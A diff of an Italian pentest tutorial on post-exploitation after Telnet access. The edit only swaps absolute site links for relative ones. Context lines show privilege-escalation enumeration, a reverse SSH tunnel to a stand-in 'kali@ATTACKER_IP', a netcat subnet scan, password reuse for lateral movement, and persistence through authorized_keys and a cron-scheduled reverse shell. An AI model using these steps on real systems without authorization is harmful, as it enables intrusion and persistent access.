@@ -124,7 +124,7 @@ sudo -l
 crontab -l
 ```
 
-Per l'enumerazione SUID/capabilities/cron completa vedi [SUID](https://hackita.it/articoli/suid/) e la [guida Linux Privesc](https://hackita.it/articoli/linux-privesc/); per verificare binari sfruttabili una volta trovato un vettore, [GTFOBins](https://hackita.it/articoli/gtfobins/) resta il riferimento più veloce.
+Per l'enumerazione SUID/capabilities/cron completa vedi [SUID](/articoli/suid/) e la [guida Linux Privesc](/articoli/linux-privesc/); per verificare binari sfruttabili una volta trovato un vettore, [GTFOBins](/articoli/gtfobins/) resta il riferimento più veloce.
 
 ## Fase 6 — Pivoting
 
@@ -158,7 +158,7 @@ ssh -R 2222:localhost:22 -N -f kali@ATTACKER_IP
 ssh -p 2222 localhost
 ```
 
-Per approfondire tecniche di pivoting oltre il singolo tunnel, vedi la [guida al pivoting](https://hackita.it/articoli/pivoting/) e, per il tunneling SSH in generale, l'articolo su [SSH](https://hackita.it/articoli/ssh/).
+Per approfondire tecniche di pivoting oltre il singolo tunnel, vedi la [guida al pivoting](/articoli/pivoting/) e, per il tunneling SSH in generale, l'articolo su [SSH](/articoli/ssh/).
 
 Dall'host compromesso, una scansione mirata sulla subnet interna aiuta a mappare servizi non visibili dall'esterno:
 
@@ -166,7 +166,7 @@ Dall'host compromesso, una scansione mirata sulla subnet interna aiuta a mappare
 for i in {1..254}; do timeout 1 nc -zv 10.20.30.$i 445 2>&1 | grep succeeded; done
 ```
 
-Per test di connettività più strutturati vedi la [guida Netcat](https://hackita.it/articoli/netcat/).
+Per test di connettività più strutturati vedi la [guida Netcat](/articoli/netcat/).
 
 ## Fase 7 — Lateral Movement
 
@@ -176,7 +176,7 @@ Il vettore più comune dopo Telnet non è tecnico ma di riuso: la stessa passwor
 ssh user@internal-ip
 ```
 
-Se il target ha anche [SMB](https://hackita.it/articoli/smb/) esposto, vale la pena verificare lo stesso riuso lì prima di assumere che l'accesso Telnet sia un vicolo cieco isolato.
+Se il target ha anche [SMB](/articoli/smb/) esposto, vale la pena verificare lo stesso riuso lì prima di assumere che l'accesso Telnet sia un vicolo cieco isolato.
 
 ## Persistence Dopo il Compromesso Telnet
 
@@ -186,7 +186,7 @@ Solo se previsto dallo scope dell'engagement. In sintesi, senza duplicare l'inte
 * chiave pubblica in `authorized_keys` per un accesso SSH persistente;
 * cron job o entry di avvio (`rc.local`) per un reverse shell schedulato.
 
-Per il dettaglio sulla sintassi cron vedi l'articolo su [crontab](https://hackita.it/articoli/crontab/). Ogni voce qui è un IoC facilmente rilevabile: da usare solo se l'engagement lo richiede esplicitamente.
+Per il dettaglio sulla sintassi cron vedi l'articolo su [crontab](/articoli/crontab/). Ogni voce qui è un IoC facilmente rilevabile: da usare solo se l'engagement lo richiede esplicitamente.
 
 ## Troubleshooting: Telnet Aperto ma Non Riesco ad Autenticarmi
 
